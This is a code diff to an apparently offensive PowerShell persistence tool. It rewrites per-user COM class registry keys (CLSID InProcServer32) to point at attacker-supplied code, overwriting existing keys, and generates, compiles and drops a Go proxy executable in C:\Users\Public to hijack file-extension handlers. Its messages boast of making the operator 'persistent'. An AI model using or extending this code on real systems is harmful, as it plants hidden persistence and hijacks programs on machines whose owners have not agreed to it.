@@ -52,8 +52,12 @@ function COM-Object
 		$Path1 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}"
 		$Path2 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}\InProcServer32"
 	}
-	New-Item -Path $Path1 
-	New-Item -Path $Path2
+	Try{
+		New-Item -Path $Path1 
+		New-Item -Path $Path2
+	}Catch{
+		Write-Host "The key value exists already. I'm gonna overwrite it!"
+	}
 	Set-Item -Path $Path2 -Value $code
 	Write-Host "Hell yeah! Now you are persistent too!"
 	$input = Read-Host "Now, press any key and leave me alone!"
@@ -93,7 +97,7 @@ function generateProxy($a,$b){
 		cmd1.Start()
 	}
 	"
-	$code | Set-Content -Encoding utf8 C:\Windows\Temp\proxy.go
+	$code | Set-Content -Encoding utf8 C:\Users\Public\proxy.go
 
 }
 
@@ -144,10 +148,10 @@ function Extension-Handler
 				generateProxy $n $code
 				$value = $split
 				Try{
-					cd C:\Windows\Temp\
-					go build C:\Windows\Temp\proxy.go
-					$path = "C:\Windows\Temp\proxy.exe"
-					del C:\Windows\Temp\proxy.go
+					cd C:\Users\Public
+					go build C:\Users\Public\proxy.go
+					$path = "C:\Users\Public\proxy.exe"
+					del C:\Users\Public\proxy.go
 
 				}Catch{
 
